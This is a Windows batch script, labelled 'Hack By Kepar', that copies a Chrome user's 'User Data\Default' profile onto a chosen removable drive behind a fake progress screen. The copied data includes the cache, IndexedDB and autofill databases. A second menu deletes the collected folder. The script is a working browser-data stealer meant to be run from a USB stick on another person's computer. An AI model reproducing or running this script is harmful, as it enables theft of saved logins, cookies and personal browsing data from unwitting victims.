:home
@echo off
color b
cls
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                          Hack By
echo                           Kepar
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                      Choose a device
echo.
echo                          D:\ (1)
echo.
echo                          E:\ (2)
echo.
echo                          F:\ (3)
echo.
echo                          G:\ (4)
echo.
echo                    Delete The Folder (5)}
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
set /p web=:
if "%web%"=="1" goto d
if "%web%"=="2" goto e
if "%web%"=="3" goto f
if "%web%"=="4" goto g
if "%web%"=="5" goto dell
goto home

:d
set KIKI=D:
goto main

:e
set KIKI=E:
goto main

:f
set KIKI=F:
goto main

:g
set KIKI=G:
goto main

:main
%kiki%
mkdir init
cd init
mkdir IndexedDB
mkdir AutoFillDatabase
mkdir Cache
mkdir AutofillStrikeDatabase
cls
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                          Hack By
echo                           Kepar
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                             0%%%
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Xcopy "%localappdata%\Google\Chrome\User Data\Default"  %kiki%\init /Q >nul
cls
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                          Hack By
echo                           Kepar
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                            20%%%
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Xcopy "%localappdata%\Google\Chrome\User Data\Default\Cache"  %kiki%\init\Cache /E /H /C /I /Q >nul
cls
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                          Hack By
echo                           Kepar
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                            40%%%
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Xcopy "%localappdata%\Google\Chrome\User Data\Default\IndexedDB"  %kiki%\init\IndexedDB /E /H /C /I /Q >nul
cls
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                          Hack By
echo                           Kepar
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                            60%%%
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Xcopy "%localappdata%\Google\Chrome\User Data\Default\AutoFillDatabase"  %kiki%\init\AutoFillDatabase /E /H /C /I /Q >nul
cls
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                          Hack By
echo                           Kepar
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                            80%%%
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Xcopy "%localappdata%\Google\Chrome\User Data\Default\AutofillStrikeDatabase"  %kiki%\init\AutofillStrikeDatabase /E /H /C /I /Q >nul
cls
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                          Hack By
echo                           Kepar
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                          All Files
echo                           Copied
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                   Strike a key to leave
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
pause >nul 
exit


:dell
cls
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                     Delete init folde
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo                      Choose a device
echo.
echo                          D:\ (1)
echo.
echo                          E:\ (2)
echo.
echo                          F:\ (3)
echo.
echo                          G:\ (4)
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
set /p web=:
if "%web%"=="1" goto dd
if "%web%"=="2" goto ee
if "%web%"=="3" goto ff
if "%web%"=="4" goto gg

:dd
set KIKI2=D:
goto dd22

:ee
set KIKI2=E:
goto dd22

:ff
set KIKI2=F:
goto dd22

:gg
set KIKI2=G:
goto dd22

:dd22
cd D:\
cls
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo.
echo           Are you sure u want to delete this
echo                      folder...
echo            this action cant be reversed
echo.
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
rmdir /s %kiki2%\init
pause
exit






